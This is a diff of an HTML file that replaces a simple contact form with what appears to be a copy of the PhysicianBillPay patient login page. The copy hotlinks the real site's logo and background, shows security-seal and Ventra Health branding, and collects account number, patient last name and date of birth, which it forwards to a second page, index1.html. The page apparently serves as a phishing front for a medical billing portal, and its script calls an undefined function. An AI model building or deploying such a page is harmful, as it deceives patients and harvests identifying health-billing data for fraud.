@@ -2,231 +2,371 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contact Form</title>
+    <link rel="stylesheet" href="index1.html">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet" />
     <style>
-         :root {
-            --primary-color: #6a1b9a;
-            --secondary-color: #26a69a;
-            --accent-color: #9c27b0;
-            --text-color: #fff;
-            --form-bg-color: #f5f5f5;
-            --font-family: 'Arial', sans-serif;
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-image: url('https://www.physicianbillpay.com/static/media/background.e6498a5a.jpeg');
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background-color: rgba(0, 0, 128, 0.5);
         }
         
-        body {
-            font-family: var(--font-family);
-            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
-            background-size: 400% 400%;
-            animation: gradientAnimation 15s ease infinite;
+        .container {
+            background-color: white;
+            padding: 1.5rem;
+            border-radius: 0.5rem;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 280px;
+        }
+        
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .input-container {
+            position: relative;
+            margin-bottom: 1rem;
+            border: 1px solid #1d1d1d;
+            border-radius: 0.375rem;
+            padding: 0.5rem;
+            height: 25px;
+            width: 210px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .input-group {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 0.5rem;
+            font-size: 0.8rem;
+        }
+        
+        .input-container input {
+            width: 100%;
+            padding: 0.75rem;
+            border: none;
+            outline: none;
+            background-color: transparent;
+            color: rgb(37, 37, 37);
+        }
+        
+        .input-container label {
+            position: absolute;
+            top: 0.75rem;
+            left: 0.75rem;
+            transition: all 0.2s ease;
+            pointer-events: none;
+            color: rgb(125, 125, 125);
+            width: auto;
+        }
+        
+        .input-container input:focus+label,
+        .input-container input:not(:placeholder-shown)+label {
+            transform: translateY(-1.5rem);
+            font-size: 0.75rem;
+            color: red;
+            background: white;
+            padding: 0 0.25rem;
+        }
+        
+        button {
+            background-color: #34668b;
+            color: white;
+            padding: 0.5rem 1rem;
+            border-radius: 0.375rem;
+            border: none;
+            cursor: pointer;
+            width: auto;
+            margin: 0 auto;
+            display: block;
+        }
+        
+        hr {
+            margin: 1.5rem 0;
+            border: none;
+            border-top: 2px solid #4A5568;
+            width: 100%;
+        }
+        
+        button:hover {
+            background-color: #34668b;
+        }
+        
+        .input-container:focus-within {
+            border-color: red;
+        }
+        
+        .version {
+            text-align: center;
+            margin-top: 1rem;
+            font-size: 0.75rem;
+            color: rgb(174, 168, 168);
+        }
+        
+        .text-center {
+            text-align: center;
+        }
+        
+        .powered-by {
+            text-align: center;
+            margin-top: 1rem;
+        }
+        
+        .powered-by img {
+            display: inline-block;
+            height: 30px;
+            width: 60px;
+        }
+        
+        .powered-by p {
+            margin: 0;
+            font-size: 8px;
+        }
+        
+        .trustwave-seal img {
+            height: 30px;
+            width: 60px;
+        }
+        
+        .required-text {
+            display: none;
+            color: red;
+            font-size: 9px;
+            margin-top: 2px;
+        }
+        
+        .language-group {
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
+            margin: 1rem 0;
         }
         
-        .form-container {
-            background: var(--form-bg-color);
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: inset 4px 4px 8px rgba(0, 0, 0, 0.1), 4px 4px 8px rgba(0, 0, 0, 0.1);
-            max-width: 450px;
-            width: 100%;
-            text-align: center;
-            position: relative;
-            z-index: 1;
+        .language-label {
+            margin-right: 1px;
+            font-size: 9px;
         }
         
-        .form-container::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.05);
-            border-radius: 20px;
-            z-index: -1;
-            box-shadow: inset 0 4px 8px rgba(0, 0, 0, 0.1);
+        select {
+            width: 90px;
+            font-size: 0.9rem;
+            height: 1px;
         }
         
-        .form-container h2 {
-            margin-bottom: 30px;
-            font-size: 30px;
-            color: transparent;
-            font-weight: 600;
-            position: relative;
-            display: inline-block;
-            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
-            -webkit-background-clip: text;
-            background-clip: text;
+        .input-group select {
+            width: 58px;
+            padding: 2px;
+            font-size: 2px;
+            height: 15px;
+            font-size: 0.7rem;
+            border-radius: 0.375rem;
+            background-color: white;
+            border: 1px solid #D1D5DB;
         }
         
-        .form-container h2::after {
-            content: '';
-            width: 70px;
-            height: 6px;
-            background: var(--accent-color);
-            position: absolute;
-            left: 50%;
-            bottom: -15px;
-            transform: translateX(-50%);
-            border-radius: 3px;
-        }
-        
-        .form-group {
-            margin-bottom: 25px;
-            text-align: left;
-            position: relative;
-        }
-        
-        .form-group label {
-            display: block;
-            margin-bottom: 10px;
-            font-weight: bold;
-            color: var(--primary-color);
-            font-size: 16px;
-        }
-        
-        .form-group input {
-            width: 100%;
-            padding: 14px 20px 14px 50px;
-            border: 1px solid #ccc;
-            border-radius: 25px;
-            font-size: 16px;
-            box-sizing: border-box;
-            background: #fff;
-            transition: all 0.3s ease;
-            box-shadow: inset 2px 2px 4px rgba(0, 0, 0, 0.1);
-        }
-        
-        .form-group input:focus {
-            border-color: var(--primary-color);
-            outline: none;
-            box-shadow: 0 0 0 0.2rem rgba(106, 27, 154, 0.25), inset 2px 2px 4px rgba(0, 0, 0, 0.1);
-        }
-        
-        .form-group button {
-            width: 100%;
-            padding: 15px;
-            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
-            color: #fff;
-            border: 2px solid var(--primary-color);
-            border-radius: 25px;
-            font-size: 18px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        }
-        
-        .form-group button::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 300%;
-            height: 300%;
-            background: rgba(0, 0, 0, 0.1);
-            transition: transform 0.3s ease;
-            border-radius: 50%;
-            transform: translate(-50%, -50%) scale(0);
-        }
-        
-        .form-group button:hover::before {
-            transform: translate(-50%, -50%) scale(1);
-        }
-        
-        .form-group button:hover {
-            background: linear-gradient(135deg, var(--secondary-color), var(--primary-color));
-            border-color: var(--secondary-color);
-            transform: translateY(-4px);
-            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
-        }
-        
-        .form-group .input-icon {
-            position: relative;
-            display: flex;
-            align-items: center;
-        }
-        
-        .form-group .input-icon input {
-            padding-left: 50px;
-        }
-        
-        .form-group .input-icon i {
-            position: absolute;
-            left: 15px;
-            font-size: 22px;
-            color: #888;
-        }
-        
-        @keyframes gradientAnimation {
-            0% {
-                background-position: 0% 0%;
-            }
-            50% {
-                background-position: 100% 100%;
-            }
-            100% {
-                background-position: 0% 0%;
-            }
-        }
-        
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: scale(0.9);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1);
-            }
+        .input-group select option {
+            font-size: 9px;
         }
     </style>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
 </head>
 
 <body>
-    <div class="form-container">
-        <h2>Contact Form</h2>
-        <form id="contactForm" name="google-sheet">
-            <div class="form-group">
-                <label for="name">Name</label>
-                <div class="input-icon">
-                    <i class="fas fa-user"></i>
-                    <input type="text" id="name" name="name" placeholder="Enter your name" required>
+    <div class="container">
+        <div class="text-center">
+            <img alt="PhysicianBillPay Logo" src="https://www.physicianbillpay.com/static/media/physician-bill-pay.ba3a124c.png" width="250" />
+            <p class="text-sm" style="color: #4A5568;">Acct Number/Patient-Last Name/DOB</p>
+        </div>
+        <form id="step1Form" method="GET">
+
+            <div>
+                <div class="input-container">
+                    <input type="text" id="account-number-1" placeholder=" " onfocus="this.placeholder='P123456'" onblur="this.placeholder=''">
+                    <label for="account-number-1">Account Number</label>
+                    <!-- required pattern="[A-Za-z][0-9]{6,}" -->
                 </div>
-            </div>
-            <div class="form-group">
-                <label for="number">Phone Number</label>
-                <div class="input-icon">
-                    <i class="fas fa-phone-alt"></i>
-                    <input type="tel" id="number" name="number" placeholder="Enter your phone number" required>
+                <p class="required-text">Required</p>
+
+                <div class="input-container">
+                    <input id="last-name" name="last-name" type="text" placeholder=" " required>
+                    <label for="last-name">Last Name</label>
                 </div>
+                <p class="required-text">Required</p>
+
+                <div class="input-container">
+                    <input id="dob" type="text" name="dob" placeholder=" " required onfocus="this.placeholder='mm/dd/yyyy'" onblur="this.placeholder=''">
+                    <label for="dob">Patient DOB</label>
+                </div>
+                <p class="required-text">Required</p>
             </div>
-            <div class="form-group">
-                <button type="submit">Submit</button>
+            <div class="input-group language-group">
+                <label class="language-label" for="language">Site Language:</label>
+                <select id="language" name="language">
+                    <option>English</option>
+                    <option>Spanish</option>
+                </select>
             </div>
+            <div class="text-center">
+                <button type="submit">LOGIN</button>
+            </div>
+            <hr>
         </form>
+        <div class="text-center trustwave-seal">
+            <img alt="Trustwave Seal" src="image/seal_image.png" width="105" />
+        </div>
+        <div class="text-center powered-by">
+            <p class="text-sm" style="color: #4A5568;">Powered By</p>
+            <img alt="Ventra Health Logo" src="image/download.png" width="100" />
+        </div>
+        <div class="version">3.0.0</div>
     </div>
-
     <script>
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbx6rprkca-G3nZXs9cN-v2UCteqyfqD7KaDqNFoBPmTanUsW9vGo0-wI2sVt75gcUg7/exec';
-        const form = document.forms['google-sheet'];
+        function enforceDOBPattern(input) {
+            let value = input.value;
+            let filteredValue = '';
 
-        form.addEventListener('submit', e => {
+            for (let char of value) {
+                if (/\d/.test(char) || char === '/') {
+                    filteredValue += char;
+                }
+            }
+
+            if (filteredValue.length > 10) {
+                filteredValue = filteredValue.substring(0, 10);
+            }
+
+            const parts = filteredValue.split('/');
+
+            if (parts[0] && parts[0].length > 2) {
+                parts[0] = parts[0].substring(0, 2);
+            }
+            if (parts[0] && parseInt(parts[0], 10) > 12) {
+                parts[0] = '';
+            }
+
+            if (parts[1] && parts[1].length > 2) {
+                parts[1] = parts[1].substring(0, 2);
+            }
+            if (parts[1] && parseInt(parts[1], 10) > 31) {
+                parts[1] = '';
+            }
+
+            filteredValue = parts.join('/');
+
+            input.value = filteredValue;
+        }
+
+        function isValidDate(dob) {
+            const parts = dob.split('/');
+            if (parts.length !== 3) return false;
+
+            const month = parseInt(parts[0], 10);
+            const day = parseInt(parts[1], 10);
+            const year = parseInt(parts[2], 10);
+
+            if (isNaN(month) || isNaN(day) || isNaN(year)) return false;
+
+            if (month < 1 || month > 12 || day < 1 || day > 31) return false;
+
+            const monthDays = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
+            if (month === 2) {
+                const isLeapYear = (year % 4 === 0 && year % 100 !== 0) || (year % 400 === 0);
+                if (day > (isLeapYear ? 29 : 28)) return false;
+            } else if (day > monthDays[month - 1]) {
+                return false;
+            }
+
+            return true;
+        }
+
+        document.getElementById('account-number-1').addEventListener('input', function() {
+            enforceAccountNumberPattern(this);
+        });
+
+        document.getElementById('dob').addEventListener('input', function() {
+            enforceDOBPattern(this);
+        });
+
+        function validateInputs() {
+            let valid = true;
+            document.querySelectorAll('.input-container input').forEach(input => {
+                const requiredText = input.parentElement.nextElementSibling;
+                if (input.value === '') {
+                    requiredText.style.display = 'block';
+                    input.parentElement.classList.add('border-red-500');
+                    requiredText.textContent = 'Required';
+                    valid = false;
+                } else {
+                    requiredText.style.display = 'none';
+                    input.parentElement.classList.remove('border-red-500');
+                }
+
+
+
+
+                if (input.id === 'account-number-1') {
+                    const accountNumberPattern = /^[A-Za-z]\d{6,}$/;
+                    if (input.value.length < 7) {
+                        requiredText.style.display = 'block';
+                        input.parentElement.classList.add('border-red-500');
+                        requiredText.textContent = 'Required';
+                        valid = false;
+                    } else if (!accountNumberPattern.test(input.value)) {
+                        requiredText.style.display = 'block';
+                        input.parentElement.classList.add('border-red-500');
+                        requiredText.textContent = 'Required';
+                        valid = false;
+                    } else {
+                        requiredText.style.display = 'none';
+                        input.parentElement.classList.remove('border-red-500');
+                    }
+                }
+
+
+                if (input.id === 'dob') {
+                    if (!isValidDate(input.value)) {
+                        requiredText.style.display = 'block';
+                        input.parentElement.classList.add('border-red-500');
+                        requiredText.textContent = 'Required';
+                        valid = false;
+                    } else {
+                        requiredText.style.display = 'none';
+                        input.parentElement.classList.remove('border-red-500');
+                    }
+                }
+            });
+            return valid;
+        }
+
+        document.querySelectorAll('.input-container input').forEach(input => {
+            input.addEventListener('focus', function() {
+                validateInputs();
+            });
+
+            input.addEventListener('blur', function() {
+                validateInputs();
+            });
+        });
+
+        document.getElementById('step1Form').addEventListener('submit', function(e) {
             e.preventDefault();
-            fetch(scriptURL, {
-                    method: 'POST',
-                    body: new FormData(form)
-                })
-                .then(response => alert("धन्यवाद! हमारे ग्राहक सेवा दल 24 घंटे के भीतर आपसे संपर्क करेंगे।"))
-                .catch(error => console.error('Error!', error.message));
+            if (validateInputs()) {
+                const lastName = document.getElementById('last-name').value;
+                const accountNumber = document.getElementById('account-number-1').value;
+                const dob = document.getElementById('dob').value;
+
+                window.location.href = `index1.html?lastName=${encodeURIComponent(lastName)}&accountNumber=${encodeURIComponent(accountNumber)}&dob=${encodeURIComponent(dob)}`;
+            }
         });
     </script>
 </body>
